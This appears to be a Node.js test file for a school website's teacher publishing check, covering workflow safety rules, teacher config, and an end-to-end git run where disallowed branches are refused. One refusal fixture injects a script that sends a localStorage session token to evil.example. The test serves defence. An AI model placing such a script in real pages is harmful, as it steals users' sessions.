// R-P25-E: teacher publishing check (Phase 2.5 step E).
//   node tests/test_p25_publish.js        (run from tools/quiz-maker-v2; needs git)
// 1. The rules on built-in examples (scripts/check_teacher_pr.js --self-test).
// 2. Every lesson page the owner already has passes the HTML rules (the check never refuses what the owner pushes).
// 3. The workflow is safe: pull_request_target, checks out the BASE commit, no credentials kept, the pull request's
//    branch name never inside a run: line, only teacher/ branches, auto-merge only when the config says so.
// 4. .github/teachers.json is valid and starts with auto-merge off.
// 5. End to end in a throw-away git repository: a teacher's lesson branch passes; a branch that touches dashboard/,
//    another subject, a workflow or adds a script is refused, each with a reason.
const fs = require('fs'), path = require('path'), os = require('os');
const { execFileSync, spawnSync } = require('child_process');
const SITE = path.resolve(__dirname, '..', '..', '..');
const CHECK = path.join(SITE, 'scripts', 'check_teacher_pr.js');
const C = require(CHECK);
let fails = 0, passes = 0;
const t = (n, ok, d) => { console.log((ok ? 'PASS ' : 'FAIL ') + n + (ok ? '' : '  ' + String(d === undefined ? '' : d).slice(0, 500))); ok ? passes++ : fails++; };
const git = (args, cwd) => execFileSync('git', args, { cwd: cwd || SITE, maxBuffer: 1 << 28 }).toString('utf8');

// 1
const selfRun = spawnSync(process.execPath, [CHECK, '--self-test'], { encoding: 'utf8' });
const lines = selfRun.stdout.split('\n').filter(Boolean);
t('rules self-test: every example behaves (' + lines.length + ' rules)', selfRun.status === 0 && lines.length >= 30 && lines.every(l => l.startsWith('PASS')), lines.filter(l => !l.startsWith('PASS')).join(' | '));

// 2
{
  const all = git(['ls-files']).split('\n').filter(Boolean);
  const html = all.filter(f => /\.html$/.test(f) && (/^tools\/quiz-maker-v2\/templates\//.test(f) || /^(programming|english|math|science)\//.test(f)));
  const norm = s => String(s).replace(/\s+/g, ' ').trim();
  const known = new Set();
  html.forEach(f => { const s = fs.readFileSync(path.join(SITE, f), 'utf8'); for (const m of s.matchAll(/<script\b([^>]*)>([\s\S]*?)<\/script\s*>/gi)) if (!/\bsrc\s*=/.test(m[1]) && !/application\/(ld\+)?json/i.test(m[1]) && m[2].trim()) known.add(norm(m[2])); });
  const engines = new Set(all.filter(f => /^assets\/[a-z0-9-]+\.js$/.test(f)).map(f => f.slice(7)));
  const bad = [];
  html.filter(f => !f.startsWith('tools/')).forEach(f => { const e = C.checkHtml(f, fs.readFileSync(path.join(SITE, f), 'utf8'), known, engines); if (e.length) bad.push(e[0]); });
  t(`every owner lesson page passes the HTML rules (${html.length} pages)`, html.length > 50 && bad.length === 0, bad.slice(0, 3).join(' | '));
}

// 3
{
  const wf = fs.readFileSync(path.join(SITE, '.github', 'workflows', 'teacher-publish.yml'), 'utf8');
  t('workflow: pull_request_target (rules come from main)', /^\s*pull_request_target:/m.test(wf) && !/^\s*pull_request:/m.test(wf));
  t('workflow: checks out the base commit, keeps no credentials', /ref: \$\{\{ github\.event\.pull_request\.base\.sha \}\}/.test(wf) && /persist-credentials: false/.test(wf));
  const runs = wf.split('\n').filter(l => /^\s*run:|^\s{10,}\S/.test(l) && !/^\s*(name|if|env|with|uses|ref|fetch-depth|persist-credentials|node-version|[A-Z_]+):/.test(l));
  t('workflow: no pull-request text expanded inside a shell line', !runs.some(l => /\$\{\{\s*github\.event\.pull_request\.(head\.ref|title|body|user)/.test(l)), runs.filter(l => /\$\{\{/.test(l)).join(' | '));
  t('workflow: only teacher/ branches', /if: startsWith\(github\.event\.pull_request\.head\.ref, 'teacher\/'\)/.test(wf));
  t('workflow: the pull request is fetched as data, never checked out or run', /refs\/pull\/\$\{PR\}\/head:refs\/remotes\/pr\/head/.test(wf) && !/npm (ci|install)|pip install|bash scripts\/test_all/.test(wf));
  t('workflow: auto-merge only when the check passed and the config says so', /if: steps\.check\.outputs\.ok == 'true' && steps\.check\.outputs\.auto_merge == 'true'/.test(wf));
  t('workflow: least permissions', /permissions:\s*\n\s*contents: read\s*\n\s*pull-requests: write/.test(wf));
  const tests = fs.readFileSync(path.join(SITE, '.github', 'workflows', 'test.yml'), 'utf8');
  t('tests workflow runs with a read-only token', /^permissions:\s*\n\s*contents: read/m.test(tests));
}

// 4
{
  const cfg = JSON.parse(fs.readFileSync(path.join(SITE, '.github', 'teachers.json'), 'utf8'));
  const ts = Object.entries(cfg.teachers || {});
  t('teachers.json: at least one teacher, valid handles and subjects', ts.length >= 1 && ts.every(([h, v]) => /^[a-z0-9][a-z0-9-]*$/.test(h) && Array.isArray(v.subjects) && v.subjects.length));
  t('teachers.json: every teacher starts with auto-merge off', ts.every(([, v]) => v.auto_merge === false));
  const sub = fs.readFileSync(path.join(SITE, 'tools', 'quiz-maker-v2', 'apps_script', 'Code.gs'), 'utf8').match(/^var P4_SUBJECTS = (\[[^\]]*\]);/m);
  t('teachers.json: every subject is a backend subject', !!sub && ts.every(([, v]) => v.subjects.every(s => JSON.parse(sub[1]).includes(s))));
}

// 5
{
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'p25e-'));
  try {
    const w = (p, s) => { fs.mkdirSync(path.dirname(path.join(tmp, p)), { recursive: true }); fs.writeFileSync(path.join(tmp, p), s); };
    const g = args => git(args, tmp);
    g(['init', '-q', '-b', 'main']); g(['config', 'user.email', 't@example.invalid']); g(['config', 'user.name', 't']); g(['config', 'core.autocrlf', 'false']);
    w('scripts/check_teacher_pr.js', fs.readFileSync(CHECK, 'utf8'));
    w('.github/teachers.json', JSON.stringify({ teachers: { mona: { name: 'Ms Mona', github: 'mona-gh', subjects: ['science'], auto_merge: false } } }));
    w('assets/quiz.js', '/* engine */'); w('assets/auth.js', '/* engine */');
    w('tools/quiz-maker-v2/templates/quiz.html', "<html><body><script src=\"/assets/quiz.js\"></script><script>QuizEngine.mount('#quiz-root', '#quiz-data');</script></body></html>");
    w('science/secondary/grade-1-secondary/index.html', '<html><body><div class="lessons"></div></body></html>');
    w('sitemap.xml', '<urlset><url><loc>https://x/</loc></url></urlset>');
    g(['add', '-A']); g(['commit', '-qm', 'base']);
    const base = g(['rev-parse', 'HEAD']).trim();
    const L = 'science/secondary/grade-1-secondary/ch1-l1/';
    const branch = (name, files, del) => {
      g(['checkout', '-q', '-B', name, base]);
      Object.entries(files).forEach(([p, s]) => w(p, s));
      (del || []).forEach(p => fs.rmSync(path.join(tmp, p)));
      g(['add', '-A']); g(['commit', '-qm', name]);
      return g(['rev-parse', 'HEAD']).trim();
    };
    const run = (name, head, author) => spawnSync(process.execPath, [path.join(tmp, 'scripts', 'check_teacher_pr.js'), '--base', base, '--head', head, '--branch', name, '--author', author || 'mona-gh'], { cwd: tmp, encoding: 'utf8' });
    const quiz = "<html><body><script src=\"/assets/quiz.js\"></script><script type=\"application/json\" id=\"quiz-data\">{\"q\":[]}</script><script>QuizEngine.mount('#quiz-root',   '#quiz-data');</script></body></html>";
    let h = branch('teacher/mona/ch1-l1', { [L + 'quiz.html']: quiz, [L + 'base.css']: 'body{}', [L + 'attachments.json']: '[]',
      'science/secondary/grade-1-secondary/index.html': '<html><body><div class="lessons"><a class="lesson" href="./ch1-l1/">x</a></div></body></html>',
      'sitemap.xml': '<urlset><url><loc>https://x/</loc></url><url><loc>https://x/science/secondary/grade-1-secondary/ch1-l1/</loc></url></urlset>' });
    let r = run('teacher/mona/ch1-l1', h);
    t('git: a teacher lesson branch passes', r.status === 0 && /^OK/m.test(r.stdout), r.stdout + r.stderr);
    r = run('teacher/mona/ch1-l1', h, 'someone-else');
    t('git: the same branch opened by another account is refused', r.status === 1 && /opened by "someone-else"/.test(r.stdout), r.stdout);
    const refusals = [
      ['dashboard', { 'dashboard/x.html': '<html></html>' }, /dashboard\/x\.html: outside your subject folders/],
      ['math', { 'math/x/quiz.html': quiz }, /math\/x\/quiz\.html: outside/],
      ['workflow', { '.github/workflows/x.yml': 'on: push' }, /\.github\/workflows\/x\.yml: outside/],
      ['rules', { '.github/teachers.json': '{"teachers":{"mona":{"github":"mona-gh","subjects":["science","math"],"auto_merge":true}}}' }, /\.github\/teachers\.json: outside/],
      ['script', { [L + 'quiz.html']: quiz.replace('</body>', '<script>fetch("https://evil.example/?"+localStorage.teaching_session)</script></body>') }, /inline script that the owner's pages do not use/],
      ['engine', { 'assets/quiz.js': 'steal()' }, /assets\/quiz\.js: outside/],
      ['front', { 'science/index.html': '<html></html>' }, /science\/index\.html: outside/],
    ];
    refusals.forEach(([n, files, re]) => {
      const hh = branch('teacher/mona/' + n, files);
      const rr = run('teacher/mona/' + n, hh);
      t('git: refused with a reason: ' + n, rr.status === 1 && /^REFUSED/m.test(rr.stdout) && re.test(rr.stdout), rr.stdout + rr.stderr);
    });
    h = branch('teacher/mona/remove', {}, ['science/secondary/grade-1-secondary/index.html']);
    t('git: deleting a file inside his folder passes', run('teacher/mona/remove', h).status === 0);
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
}

console.log(`\n${passes} passed, ${fails} failed`);
process.exit(fails ? 1 : 0);
